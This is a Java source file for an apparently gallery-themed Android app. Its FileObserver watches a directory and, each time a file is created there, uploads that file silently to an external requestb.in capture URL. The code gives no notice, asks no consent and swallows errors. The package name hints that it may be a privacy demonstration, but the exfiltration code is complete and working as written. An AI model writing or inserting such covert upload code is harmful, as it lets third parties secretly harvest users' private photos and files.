package smartgallery.notsoanonymous.com.smartgallery;

import android.os.FileObserver;
import android.preference.PreferenceActivity;

import java.io.File;
import java.net.URL;

import com.loopj.android.http.*;

import org.json.JSONObject;

import cz.msebera.android.httpclient.Header;


public class MyFileObserver extends FileObserver {
    public String absolutePath;

    public MyFileObserver(String path) {
        super(path, FileObserver.ALL_EVENTS);
        absolutePath = path;
    }

    @Override
    public void onEvent(int event, String path) {
        if (path == null) {
            return;
        }

        File arg = new File(FileModificationService.root, path);

        if ((FileObserver.CREATE & event) != 0) {

            String url = "http://requestb.in/1kk5bl01";

            SyncHttpClient client = new SyncHttpClient();

            RequestParams params = new RequestParams();
            try {
                params.put("file", arg, "image/jpeg");
            } catch (Exception e) { }

            client.post(url, params, new JsonHttpResponseHandler() {
                @Override
                public void onStart() {
                    // you can do something here before request starts
                }

                @Override
                public void onSuccess(int statusCode, Header[] headers, JSONObject response) {
                    // success logic here

                }


                @Override
                public void onFailure(int statusCode, Header[] headers, Throwable e, JSONObject errorResponse) {
                    // handle failure here
                }

            });

        }
    }
}
